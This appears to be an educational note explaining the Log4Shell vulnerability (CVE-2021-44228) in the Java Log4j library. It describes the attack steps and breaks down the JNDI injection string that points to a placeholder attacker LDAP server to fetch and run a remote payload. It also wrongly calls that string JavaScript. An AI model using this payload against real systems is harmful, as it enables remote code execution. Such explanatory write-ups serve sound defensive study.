__CVE ID:__ CVE-2021-44228
__Affected software__ - Java
__Used in -__ Minecraft hack

### What is it ?

Log4j is a Java library used to log messages within software and has the ability to communicate with other services on a system. This communication functionality is where the vulnerability exists,Â **providing an opening for an attacker to inject malicious code into the logs so it can be executed on the system**.

### What does it log ?

- Messages
- Bugs
- Input commands
- Information for calculating usage data
- Information for debugging 

### How does it work ?

- The attacker setups LDAP (Lightweight Directory Access Protocol) server containing malicious payload.
- The attacker then inputs malicious JavaScript code into an input field inside the target application.

```
${jndi:ldap://attacker_server:1389/payload}
```

- The inputted code then gets sent to the logs of the server, and rather then the server parsing it as text and just logging it, it evaluates the code.
- The code then instructs `jndi`  to fetch and run a malicious payload hosted by the attacker in a remote `ldap` server. 
- The executed payload can then be used to get remote access to the target or run arbitrary code in the target depending on the payload code.  
### How does the code work ?

1. `${}`: Placeholder for the actual Log4j expression. 

2. `jndi`: This part specifies that a JNDI lookup is being performed. JNDI is a Java API for accessing directory and naming services, and it can be used to look up resources and execute commands.

3. `ldap://attacker_server:1389/payload`: This is the JNDI URL that points to an LDAP server controlled by an attacker. 

   - `ldap://`: This indicates that the protocol being used is LDAP, which is a commonly used protocol for accessing directory services.
   
   - `attacker_server`: This is the hostname or IP address of the attacker's server. 

   - `1389`: This is the port number on which the attacker's LDAP server is listening. 

   - `/payload`: This part is specific to the attacker's payload. The payload is where the attacker can potentially execute arbitrary code on the target system.

*The server in which the payload is being hosted does not necessarily have to be a LDAP server, it can be a SSH or a regular web server.*